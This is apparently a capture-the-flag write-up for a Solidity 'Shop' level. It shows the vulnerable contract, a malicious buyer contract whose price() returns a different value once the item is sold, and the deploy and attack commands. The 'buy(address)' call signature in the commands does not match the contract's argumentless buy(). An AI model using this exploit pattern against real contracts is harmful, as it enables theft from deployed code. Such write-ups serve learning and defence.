# Challenge 21 Shop
## Author Note
Сan you get the item from the shop for less than the price asked?
Things that might help:
*     Shop expects to be used from a Buyer
*     Understanding restrictions of view functions

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      // ## different value can be returned during this second call
      price = _buyer.price();
    }
  }
}
```

## Solution
* [Mallicious Contract](./src/21_Shop.sol)
```solidity
contract Mallicious {
	IShop target = IShop(0x59C040171572e3Df17909cd23b6c07a2455bB846);

	function buy() external {
		target.buy();
	}

	function price() external view returns (uint256) {
		if (target.isSold()) { return 0; } 
		else { return 101; }
	}
}
```

```sh
## Create the mallicious contract
forge create src/21_Shop.sol:Mallicious --rpc-url $RPC_URL --private-key $PK --broadcast

## Launch atk
cast send $MALLICIOUS_ADDR "buy(address)" $MY_ADDR --rpc-url $RPC_URL --private-key $PK 

## Verify changed price
❯ cast call $INSTANCE "price()" --rpc-url $RPC_URL
0x0000000000000000000000000000000000000000000000000000000000000000

```
Author mentions about the `view` function limitations: 
| Capability               | `view` | `pure` |
| ------------------------ | ------ | ------ |
| Read state variables     | ✅ Yes  | ❌ No   |
| Modify state variables   | ❌ No   | ❌ No   |
| Read function arguments  | ✅ Yes  | ✅ Yes  |
| Use local variables      | ✅ Yes  | ✅ Yes  |
| Return calculated values | ✅ Yes  | ✅ Yes  |

* if we use the `view` visibility state for `price()` function, we can't keep a state such as `checked` to identify different call sequence to return different price value, because it requries state var modificaitons.

* instead we use `target.isSold()` function to identify the external call sequence. Since the target modify their public state variable in between external calls, it often vulnerable to unexpected cases like this.
